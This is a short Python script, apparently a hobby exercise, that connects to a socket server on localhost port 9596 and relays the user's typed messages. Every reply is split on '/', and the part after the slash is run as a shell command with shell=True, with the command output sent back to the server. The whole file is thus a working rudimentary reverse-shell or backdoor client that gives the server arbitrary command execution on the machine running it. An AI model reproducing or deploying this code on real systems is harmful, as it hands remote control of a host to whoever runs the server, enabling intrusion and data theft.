import socket
import subprocess
th="localhost"
tp=9596
res="haha"
c=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
c.connect((th,tp))
while res != 'have a great day':
    i=input()
#    print(i)
    c.send(i.encode())
    #print("waiting")
    res=c.recv(1024).decode()
    l=res.split('/')
    print(l[0])
    try:
        out=subprocess.check_output(l[1],shell=True)
        c.send(out)
    except:
        c.send(l[0].encode())
#    c.send(res.encode())
print(res)
